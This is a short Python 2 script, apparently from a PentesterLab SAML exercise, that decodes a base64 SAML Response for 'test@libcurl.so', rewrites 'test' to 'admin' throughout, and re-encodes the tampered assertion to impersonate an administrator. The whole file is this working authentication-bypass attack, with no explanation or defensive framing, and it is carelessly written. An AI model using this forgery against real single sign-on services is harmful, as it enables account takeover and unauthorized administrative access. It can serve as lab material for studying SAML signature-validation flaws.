import re
import base64

str="PHNhbWxwOlJlc3BvbnNlIElEPSJfNTgxYjEyODAtNTQ0OC0wMTM5LTljNGUtMDI0MmFjMTEwMDMxIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMS0wMi0xOFQxODo1MjoxNloiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTk5YzMxYmUyLTc2ZWUwYzM0LmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfOGUwYjAxNzItNWI2Yi00ZDA2LTk4ZGMtMzhjODk4NjcyYWM0IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vaWRwLXB0bC05OWMzMWJlMi03NmVlMGMzNC5saWJjdXJsLnNvL3NhbWwvYXV0aDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfNTgxYjE0ZTAtNTQ0OC0wMTM5LTljNGUtMDI0MmFjMTEwMDMxIiBJc3N1ZUluc3RhbnQ9IjIwMjEtMDItMThUMTg6NTI6MTZaIiBWZXJzaW9uPSIyLjAiPjxJc3N1ZXI+aHR0cDovL2lkcC1wdGwtOTljMzFiZTItNzZlZTBjMzQubGliY3VybC5zby9zYW1sL2F1dGg8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbyB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZD48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiI+PC9kczpTaWduYXR1cmVNZXRob2Q+PGRzOlJlZmVyZW5jZSBVUkk9IiNfNTgxYjE0ZTAtNTQ0OC0wMTM5LTljNGUtMDI0MmFjMTEwMDMxIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiPjwvZHM6VHJhbnNmb3JtPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ij48L2RzOkRpZ2VzdE1ldGhvZD48ZHM6RGlnZXN0VmFsdWU+K2xoRFIySVZOTk9mcGNkSjBEM3I1M0FZNEw4NUZUaFh3TW9EcFhKMmFKMD08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+TnFwb1ZPYkZqVDFvM04wLzVrSWJBZEppSVp5TVcwTjZZMjArUCtKc2VpRGZpbDA3Q1dOMVFlTDI0d2t4R0xIam5TT2I4K1pqSEtjeGdmRU03VlUyZ3dXcTJjL3lKR2Y3RDZOV2NKYmptSS8xbDN3aThSNVpyUlA3S3NRVzhyS1JiYk5yOXYrNDAveGZQT0RYN3VUWDZOUEpIQnM2dmxiN0FGL2ZWaHFWa09LZU5pdTdrUzR5cjJyYnhIN0o4Uys4U3ZNQ1VkOTB5MUhMZnBTWG8vNGpzV1hoOTJKQlYySVZpdUZVTjlybkZKVFJma3lUSGZTZkhyUHRaNUtVaDNzNmtoNTFtbHFUcExiZWgyWVlHcFdzUEtKR24yeGZlTWEwWXV0RVdnc1lwNmVwUUFGa29JNUZOTUtOSUVEcm44NlJCYnZHd3J4dW5XVkFuTFh2dTROcHRqemtoVFVucFU1Ym83V1hFRFA5N1laTlhreTZoeXA2b210eHREa2EwYnlPemJXL3UyNStLQU5URG5HSW9GR1Y2Q2VXSC9sQ0duSkE1Qi9yd25YSUR3SThTT1l2ZGo5emNRSUJ4RkxBakM4MkMvUS9LbzdUZXgxWkx0UGc4WnpwMnBzY1FKejlCVnBZNFZvUitJM0JLdlZ2WEpMNGRwa1gyZ1hxU0FVUDFYSVh3MGw1M0xaTzNGUVJvMVJlSDY5YlUzUzgrZTJEekhQbEdQZjE1NFh4R0UvckdlVVM3VUkyOHRmbjBMOHhLKzhRS0FSdHJhNi9zTzVPb1J2bHRYQXZMNzBKODdyTm5FWHRSbWZkd2wwdHZaUk10amx6VUJCeC9uTGJ4em5XQWZ3ZDNPTXBQTkpWSElUTlAzY1JZS1A1YW53a0NWdHBQdlV0dVhxNmdnRFRFYTA9PC9kczpTaWduYXR1cmVWYWx1ZT48S2V5SW5mbyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJRk1EQ0NBeGdDQ1FDTkJtc2RxNEJtdURBTkJna3Foa2lHOXcwQkFRc0ZBREJhTVFzd0NRWURWUVFHRXdKQlZURVJNQThHQTFVRUNBd0lWbWxqZEc5eWFXRXhFakFRQmdOVkJBY01DVTFsYkdKdmRYSnVaVEVWTUJNR0ExVUVDZ3dNVUdWdWRHVnpkR1Z5VEdGaU1RMHdDd1lEVlFRRERBUnpZVzFzTUI0WERUSXdNRFl3TkRBd05URXpOVm9YRFRJek1ETXdNVEF3TlRFek5Wb3dXakVMTUFrR0ExVUVCaE1DUVZVeEVUQVBCZ05WQkFnTUNGWnBZM1J2Y21saE1SSXdFQVlEVlFRSERBbE5aV3hpYjNWeWJtVXhGVEFUQmdOVkJBb01ERkJsYm5SbGMzUmxja3hoWWpFTk1Bc0dBMVVFQXd3RWMyRnRiRENDQWlJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dJUEFEQ0NBZ29DZ2dJQkFNdkE5bm1nNFQ5MEI4WTFpcml4U3NSUEpEeDBFOTNxTGFKcng2Z01uUnFNdVkvN1NWTGdqUzcrazlPTjFEQUg1ZjRDaEI2REU5aWIvYXJRY1RFMzlCZ3ZZYzkrN1cyclYrSXdrSWRxR1NTK1h3OFNEQjl6Z2lxdFFPUTFXV3U1aG4vVGtGQkxHTHEzWG9FV0RYYnlSczF5MjBONjVLNjV2VEswdm05amZXcjR0WlNESjhiSzBScEFKYVY1akpJeXBUV3N5RTZwNFpwbDBCNnFzQ3hNVjJFNERNMHlFYXhKYU5mNGlOMGZ0NkUvUXAyc1lDOHRXWVprRlpCV3BmdGV2YXVvWmt2UVFrcmROWXZRdTVUdk11cWpEbkJSVVNLZ2wyQUtEOFhlUU1YcHo0NExiUkQzSnQxb2orODVIeG9nWUYwZE1SaEVrTW1nU2tJZml2VkdzaWpvTE5Ga0RNVjh3RmtNVnpoN3FDZVNDdEVXTTdtL2VodW5uMjFkTmlHaXU4OEs1Q01zMUpnbHdzcWdxMENibWlaUTdXaVk5d1IrUzhpdGUreEM3azFNUzB1aXA0SGxxbHo2VHpBN1JQTUw3UXdZdWZHQ25YSkdZQ25NY0kvclNHK1RxczluR3NkNm5xZGE3NFREemt0cEFVb3BCSUZtS1hyNW1BTkN1WU12TlRmalo3OFhYb1kxZEhrTEFzK1p5SlAxRU00L1pVZUVYNG92aWlBZHBFa2lkdDdJUk5STDlTeE5aM2xtM1JuQ2xXT1Y3ZFJYZHhScjR6SHREOVpGWEZXRUR6aXdZUEx1bzV0UGt5VjhDTDNNVWppYlFiSnhqS2V3ZGtGZWNXamhkUmw2ZzNiaUNYdDltUHJuamV4QldkelpUVzB3clhubm1hNDZ3bmoyN25rYkFnTUJBQUV3RFFZSktvWklodmNOQVFFTEJRQURnZ0lCQUxkQWVCRzNWNUtDdmZyZzViUUlRMmpwOFJZVU5DaTFGcTFkVkJvT1h4emZzeHF5Nit4UW1CckFwakx4YURhWkROcWl5RWx1dmdBM3BUQUk4UVJDNkRHTVhpbFovenhtVkFRTzNuNzMwVU5NMlBtN0JZZit5ajlabE9iWStNMkNKbDJBSlJXaThOQnpDbUwrMS9jRVRRSWt2WU5aNzlqTk5XWUJLWFJpSGx4d2dENVFLRVcrWXpqOHllM0grcVBzeFFnZkVSV2xGTEZvQWo3Q3U4MERKblp5VzU3SndCUHhNcWJvZTE1aERadFNSMTlweCtWTEVGem84UkdCR2gwWGZycE42dkRzOEdITEdHVVkzYmxzRnR2Ym9LMGJmVTAzZjh1U2NOWDdiOHJmWjUxRGdjV1dhTTdTNWdFZjJ3S212TnBINmZNS1ZXT0JuVWFHYmdUSlJNdFQza21uRDYxV1BVV3ZOV3puNTFBR3M3QWgvUnZtWUxJZm01aGp6Z0pSZHgwOXg3OGZOVGN6dk5XMDZOdkxGR25KaThHVVU1RzIyTks0b3VveTNnSUJaSEdXWW1TT0d6ZWo2QjZYV3BxMWlpVWFwQ1BZemdsTlNWeDczSnBSOXFSQ0RqZUdoVmhoY2pmRlA1eFdYczErM1dPUjZWRDRvY2FrSGhPWGtQVEpMM1ZObHd1UXdQcVlkWkhiallpK1c0cmpXd1N4b2k3S0J3Z2pGdldnYzV1VzJHQ2w1MHdjMDBBVHN0OUlRWU5DUWNHWnZYemF1Q0NCWTVWQXduN016Um1LWkpUbWNkMWp1MTIyd1o2cnNqS0wzVDdaQ2U1QVhSS3poSnFkUlM4eUpHYXBUWXBQaHFSY3NRWUtrT011RmVPWjRSbWpzVnVXNU9pMWlNR1laa0x2PC9kczpYNTA5Q2VydGlmaWNhdGU+PC9kczpYNTA5RGF0YT48L0tleUluZm8+PC9kczpTaWduYXR1cmU+PFN1YmplY3Q+PE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnBlcnNpc3RlbnQiPnRlc3RAbGliY3VybC5zbzwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iXzhlMGIwMTcyLTViNmItNGQwNi05OGRjLTM4Yzg5ODY3MmFjNCIgTm90T25PckFmdGVyPSIyMDIxLTAyLTE4VDE4OjU1OjE2WiIgUmVjaXBpZW50PSJodHRwOi8vcHRsLTk5YzMxYmUyLTc2ZWUwYzM0LmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIj48L1N1YmplY3RDb25maXJtYXRpb25EYXRhPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDIxLTAyLTE4VDE4OjUyOjExWiIgTm90T25PckFmdGVyPSIyMDIxLTAyLTE4VDE5OjUyOjE2WiI+PEF1ZGllbmNlUmVzdHJpY3Rpb24+PEF1ZGllbmNlPmh0dHA6Ly9wdGwtOTljMzFiZTItNzZlZTBjMzQubGliY3VybC5zbzo4MC9zYW1sL2F1dGg8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyMS0wMi0xOFQxODo1MjoxNloiIFNlc3Npb25JbmRleD0iXzU4MWIxNGUwLTU0NDgtMDEzOS05YzRlLTAyNDJhYzExMDAzMSI+PEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ+PC9Bc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4="
response = base64.urlsafe_b64decode(str).rstrip("=")

maliscious_response = re.sub("test", "admin", response)
result = base64.urlsafe_b64encode(maliscious_response)
print result